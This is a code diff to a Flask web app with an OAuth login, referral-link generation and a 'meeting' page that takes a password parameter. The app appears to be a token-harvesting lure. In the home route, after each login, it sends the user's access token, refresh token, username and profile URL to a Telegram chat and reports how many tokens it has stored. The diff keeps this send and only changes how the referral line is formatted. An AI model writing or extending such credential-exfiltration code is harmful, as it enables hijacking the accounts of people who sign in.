@@ -10,6 +10,7 @@ from flask import Flask, redirect, request, session, render_template, url_for, f
 from psycopg2.extras import RealDictCursor
 from functools import wraps
 
+
 # Configuration
 CLIENT_ID = os.getenv('CLIENT_ID')
 CLIENT_SECRET = os.getenv('CLIENT_SECRET')
@@ -98,12 +99,14 @@ def generate_referral_url(username):
                 
                 if result:
                     user_id, existing_referral_url = result
-                    if not existing_referral_url:
-                        referral_url = f"{base_url}/?referrer_id={user_id}"
-                        cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
-                        conn.commit()
-                        return referral_url
-                    return existing_referral_url
+                    if existing_referral_url:
+                        return existing_referral_url  # Return existing referral URL
+                    
+                    # Generate and store new referral URL if missing
+                    referral_url = f"{base_url}?referrer_id={user_id}"
+                    cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
+                    conn.commit()
+                    return referral_url
                 else:
                     print(f"User {username} not found in users table.")
                     return None
@@ -423,6 +426,7 @@ def meeting():
     code_ch = request.args.get('pwd')
     return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
 
+
 @app.route('/')
 def home():
     code = request.args.get('code')
@@ -487,13 +491,14 @@ def home():
                 session['referral_url'] = referral_url
                 total_tokens = get_total_tokens()
 
-                # Send Telegram notification with user details, including referral URL
+                # Construct message with referral URL
+                referral_text = f"🔗 Referral URL: {referral_url}\n" if referral_url else ""
                 send_message_via_telegram(
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
                     f"👤 Username: @{username}\n"
                     f"🔗 Profile URL: {profile_url}\n"
-                    f"🔗 Referral URL: {referral_url}\n"  # Included referral URL in the message
+                    f"{referral_text}"
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
 
